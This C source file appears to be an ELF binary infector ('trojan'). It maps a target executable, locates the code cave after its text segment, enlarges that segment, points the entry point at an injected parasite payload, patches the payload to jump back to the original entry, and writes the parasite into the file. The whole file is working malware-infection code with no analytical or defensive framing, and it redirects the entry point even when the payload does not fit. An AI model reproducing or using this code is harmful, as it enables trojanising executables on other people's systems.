#include<stdio.h>
#include<string.h>
#include<errno.h>
#include<elf.h>
#include<unistd.h>
#include<stdlib.h>
#include<sys/mman.h>
#include<sys/stat.h>
#include<fcntl.h>
#include "trojan.h"

struct Payload parasite;
struct Host host;

/*Open and map file into memory*/
void open_map_file(int *fd,char *filename)
{
	struct stat st;

	if((*fd = open(filename,O_RDWR))<0)
	{
		perror("open():");
		exit(EXIT_FAILURE);
	}

	if(fstat(*fd,&st)<0)
	{
		perror("fstat():");
		exit(EXIT_FAILURE);
	}

	uint8_t *mem = mmap(NULL,st.st_size,PROT_READ|PROT_WRITE|PROT_EXEC,MAP_SHARED,*fd,0);

	if(mem==MAP_FAILED)
	{
		perror("mmap:");
		exit(EXIT_FAILURE);
	}
	host.host = mem;
}

/*Extract payload*/
void extract_payload(char *parasite_path)
{
	/*open parasite*/
	int fd = open(parasite_path,O_RDONLY);
	if(fd==-1)
	{
		perror("open:");
		exit(EXIT_FAILURE);
	}

	/*set parasite size*/
	struct stat st;
	if(lstat(parasite_path,&st)<0)
	{
		perror("lstat");
		exit(EXIT_FAILURE);
	}
	parasite.size = st.st_size;

	/*create space on the heap and read the paylaod into memory*/
	parasite.parasite_code = (int8_t *)malloc(parasite.size);
	if(parasite.parasite_code==NULL)
	{
		perror("malloc:");
		exit(EXIT_FAILURE);
	}
	/*read into memory*/
	int bytes = read(fd,parasite.parasite_code,parasite.size);
	if(bytes==-1)
	{
		perror("read:");
		exit(EXIT_FAILURE);
	}

	close(fd);
}

/*Create codecave*/
void create_code_cave()
{
	Elf64_Ehdr *ehdr; Elf64_Phdr *phdr; Elf64_Shdr *shdr;

	ehdr = (Elf64_Ehdr *)host.host;
	phdr = (Elf64_Phdr *)&host.host[ehdr->e_phoff];

	/*set original entry point*/
	host.original_entry_point = ehdr->e_entry;

	/*iterate and identify text segment*/
	for(int i=0;i<ehdr->e_phnum;i++)
	{
		if(phdr[i].p_type==PT_LOAD && phdr[i].p_flags==5)
		{
			host.text_segment_end = phdr[i].p_offset + phdr[i].p_filesz;
			parasite.parasite_offset = host.text_segment_end;
			parasite.parasite_address = phdr[i].p_vaddr + phdr[i].p_filesz;

			/*calculate gap between end of text segment and next segment to see
			 * if gap is big enough for payload*/

			/*if yes, increase the text_segment end memsz and filez by payload size				 */

			uint64_t gap = phdr[i+1].p_offset - host.text_segment_end;

			if(parasite.size < gap)
			{
				phdr[i].p_filesz += parasite.size;
				phdr[i].p_memsz += parasite.size;
			}

			ehdr->e_entry = parasite.parasite_address;
		}
	}	

}

void patch_payload()
{
	uint8_t *ptr = parasite.parasite_code;
	
	for(int i=0;i<(int)parasite.size;++i)
	{
		long WORD = *((long *)(ptr + i));

		if(!(0xAAAAAAAAAAAAAAAA ^ WORD))
		{
			*((long *)(ptr+i))=host.original_entry_point;
			return;
		}
	}
}

/*copy payload into code cave*/
void infect_host()
{
	memcpy((host.host+parasite.parasite_offset),parasite.parasite_code,parasite.size);		
}
